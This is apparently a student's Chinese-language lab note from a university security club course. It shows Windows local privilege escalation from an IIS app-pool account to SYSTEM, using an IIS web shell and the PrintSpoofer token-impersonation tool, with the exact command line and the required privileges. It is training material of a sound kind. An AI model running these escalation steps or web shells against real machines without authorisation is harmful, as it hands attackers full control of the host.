---
title: NTUSTISC - AD Note - Lab(Hijack Token)
tags: [NTUSTISC, AD, information security]

---

# NTUSTISC - AD Note - Lab(Hijack Token)
[TOC]

Lecture Video: [2022/05/04 AD 安全1](https://youtu.be/Cv2gNQkDM8Q?si=M0LV3dBCMCOy58LN&t=3600)

## Background
* 提權方法
    * 利用弱點
    * Hijack Token
        * Tools: [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
        * Support: Windows 8.1/Server 2012 R2/10/Server 2019
        * How to use: `$ PrintSpoofer.exe -c "command"`
    * Guess Password
    * 管理服務
    * 錯誤配置
## Lab Time - 本地提權
### ==Hijack Token(Network Service)==
這邊講師示範的是，如何利用IIS的特殊權限，達成提權。
先解釋一下，如果要使用PrintSpoofer之類的工具有個特殊的條件，就是需要有特殊權限，也就是
:::info
```bash!
$ whoami /priv
```
需要有下列其一權限:
SeImpersonatePrivilege => CreateProcessWithToken()
SeAddignPrimaryToekn => CreateProcessAsUser()
:::
1. whoami /priv
我們先看一下正常使用者的特殊權限有哪些
    ```bash!
    $ whoami /priv

    PRIVILEGES INFORMATION
    ----------------------

    特殊權限名稱                  描述               狀況
    ============================= ================== ======
    SeShutdownPrivilege           關閉系統           已停用
    SeChangeNotifyPrivilege       略過周遊檢查       已啟用
    SeUndockPrivilege             從擴充座移除電腦   已停用
    SeIncreaseWorkingSetPrivilege 增加處理程序工作組 已停用
    SeTimeZonePrivilege           變更時區           已停用
    ```
    可以看到上述的權限都沒有在這裏面，也就是說正常的使用者是不會有這兩個權限的，那誰會有這兩個權限呢?需要==impersonation(也就是講師說的切換身分)的人==，詳細的腳本可以看這邊[^iis-windows-impersonation]但今天不會用到，總之IIS就是一個需要做身分切換的角色，所以講師已經在Win10的電腦中設定好IIS，也起用了web shell的功能，我們就可以試看看，在browser中`http://127.0.0.1/cmd.aspx`，他可以直接用IIS的權限執行程式
    ![](https://hackmd.io/_uploads/r1N1LMM03.png)

    ![](https://hackmd.io/_uploads/HySuBGMC2.png)
    從結果來看，他的確具有==SeImpersonatePrivilege==的權限而且已經啟用，那我們就可以直接用PrintSpoofer.exe執行其他指令
2. Use PrintSpoofer.exe
![](https://hackmd.io/_uploads/rkqPUMGA2.png)
從結果來看，我們的確已經提權了，再來可以用講師的指令測試一下權限
`c:\tools\PrintSpoofer64.exe -c "c:\windows\system32\cmd.exe /c whoami > c:\inetpub\wwwroot\tmp.txt"`
這一串指令是利用PrintSpoofer執行cmd.exe再執行whoami的command並寫道tmp.txt中
![](https://hackmd.io/_uploads/rk0pwGzRh.png)
目前權限已經從`iis apppool\defaultapppool`轉換成`nt authority\system`也就是前面說的==本地端真正的最高權限使用者==
## Reference
[^iis-windows-impersonation]:[ [2020鐵人賽] Day29 - 切換身分Impersonation ](https://ithelp.ithome.com.tw/articles/10252658)